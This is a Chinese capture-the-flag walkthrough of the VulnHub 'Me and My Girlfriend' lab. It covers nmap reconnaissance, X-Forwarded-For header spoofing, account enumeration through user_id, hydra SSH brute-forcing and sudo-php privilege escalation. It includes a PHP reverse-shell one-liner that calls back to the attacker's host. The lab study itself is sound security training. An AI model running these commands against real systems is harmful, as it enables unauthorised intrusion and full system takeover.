**靶场地址** ：https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/

这个靶场很简单，算是自己独立完成的第一个靶场，（中间网上看了些资料，其实可以不看的，事后发现自己特傻*）在此记录一下

首先找一下靶机

    
    
    arp-scan -l #查看同一网段主机

![1646815208_622867e8a9b259a3d563e.png!small](https://image.3001.net/images/20220309/1646815208_622867e8a9b259a3d563e.png!small)

靶机地址：192.168.66.226

nmap 扫描一下端口

    
    
    nmap -sV -sC -T4 192.168.66.226  -p-  
    -sV:扫描端口服务
    -sC：使用默认脚本扫描
    -T4：快速扫描
    -p-：扫描全端口

![1646815318_62286856dee026e151366.png!small](https://image.3001.net/images/20220309/1646815318_62286856dee026e151366.png!small)

只有两个端口，脑子里已经构思好攻击流程了，web端找漏洞，然后获取用户信息，ssh连接主机或者用九头蛇爆破一下，拿下shell再提权，先访问80端口

![1646815376_622868908414aecbbd8c1.png!small](https://image.3001.net/images/20220309/1646815376_622868908414aecbbd8c1.png!small)

凭借着敏锐的直觉，查看一下页面源代码

![1646815496_62286908a75d58b79913a.png!small](https://image.3001.net/images/20220309/1646815496_62286908a75d58b79913a.png!small)

作者给了提示，x-forwarded-for，我的物理机火狐上面有这个插件，直接用物理机访问一下，成功访问

![1646815533_6228692d37c7b1be1c6ce.png!small](https://image.3001.net/images/20220309/1646815533_6228692d37c7b1be1c6ce.png!small)

在这里花费了十多分钟找注入，最后啥也没找到，只好拿着刚刚注册的账号登陆看一下

![1646815581_6228695d3491ed49046aa.png!small](https://image.3001.net/images/20220309/1646815581_6228695d3491ed49046aa.png!small)

界面依旧十分简单，还是先找注入，又花了十多分钟，依旧啥也没有，这时候我想放弃了，但又不太甘心。

当我看着profile这个简单但又奇怪的界面时，男人的第六感告诉我这个界面一定有什么东西

![1646815633_62286991c90598dc3dc1a.png!small](https://image.3001.net/images/20220309/1646815633_62286991c90598dc3dc1a.png!small)

我试着换一下id，当hackbar中的user_id从12变成1的时候，我并不期待他能带给我什么，这一步更像是一个理由，一个让我放弃的更加心安理得的理由，页面刷新的很快，没有给我多少思考的时间，当我看到这缺乏美感的Web界面和之前有些不太一样的时候，我很难形容那种感觉。

我仿佛一个上世纪五十年代的美国青年，开着一辆破旧的哈德逊行驶在弗罗里达一条宽阔的柏油路上，周围全是略微发黄的草地，风中夹杂着车上伙伴们的喊叫声，我们漫无目的的在这条望不到头的公路上游荡，却不用担心失去什么。我们一无所有却也乐在其中

好，有点跑题了，这里明显有账户信息遍历，先把账户信息都记下来（不断更换user_id来实现遍历）

![1646815716_622869e410bac020b72d1.png!small](https://image.3001.net/images/20220309/1646815716_622869e410bac020b72d1.png!small)

按照前面的思路，我把这些信息账号和密码分开，用九头蛇跑一下22端口

    
    
    hydra   -L user.txt -P pass.txt ssh://192.168.1.7  -vv 
    -L :指定用户列表文件
    -P：指定密码列表文件
    -vv：显示破解过程详细信息

很快就跑出来了，这个靶场背景就是一个叫alice的女生在和bob谈恋爱的时候喜欢上了另一个男生

![1646815794_62286a3274a2fd8d3a203.png!small](https://image.3001.net/images/20220309/1646815794_62286a3274a2fd8d3a203.png!small)

直接连一下

![1646815856_62286a70741d2b39c02a0.png!small](https://image.3001.net/images/20220309/1646815856_62286a70741d2b39c02a0.png!small)

看到可疑文件夹.my_secret

那就让我们看一下这个alice究竟有什么秘密吧

![1646815908_62286aa43e576e79eb337.png!small](https://image.3001.net/images/20220309/1646815908_62286aa43e576e79eb337.png!small)

她果然喜欢上了别的男人，

再看一下flag有什么提示

![1646815963_62286adb40d7cc2b650f9.png!small](https://image.3001.net/images/20220309/1646815963_62286adb40d7cc2b650f9.png!small)

根据提示，这个靶场有两个flag，另一个就在root目录下

先试一下能不能suid提权

    
    
    find / -perm -u=s -type f 2>/dev/null #
    #这个suid提权我也讲不清楚，网上有很多讲解的可以搜一下

![1646816085_62286b5514f35f8519d9b.png!small](https://image.3001.net/images/20220309/1646816085_62286b5514f35f8519d9b.png!small)

好像没有能suid提权的，那就看看有没有sudo提权的命令

    
    
    sudo -l

![1646816172_62286bac508ab86094d4b.png!small](https://image.3001.net/images/20220309/1646816172_62286bac508ab86094d4b.png!small)

有一个php，那接下来就很简单了，直接通过php反弹shell就可以了，但我在这卡了很久，我忘记sudo提权需要在命令前加上sudo了，实在太傻了，其实这里有很多种方法提权，或者查看root目录下的flag

我这里写两种

1.反弹shell

首先kali上开启监听

![1646816362_62286c6a36a92c426c529.png!small](https://image.3001.net/images/20220309/1646816362_62286c6a36a92c426c529.png!small)

然后在靶机上执行命令

    
    
    sudo php -r '$sock=fsockopen("192.168.76.218",8888);exec("/bin/sh -i <&3 >&3 2>&3");'  
      
    

192.168.76.218 是kali ip

8888是kali监听的端口

成功反弹shell，查看flag

![1646816441_62286cb93b32b748937ec.png!small](https://image.3001.net/images/20220309/1646816441_62286cb93b32b748937ec.png!small)

2.直接查看flag

    
    
    sudo php -r "system('cat /root/flag2.txt');"

![1646816509_62286cfd59b49f725e8f9.png!small](https://image.3001.net/images/20220309/1646816509_62286cfd59b49f725e8f9.png!small)

其实借助php中的system方法有很多方法能够获取flag，这里就不一一列举，这个靶场过程很简单，但是之前的靶场都是需要看教程才能过，这个基本靠自己完成，记录下来纪念一下。

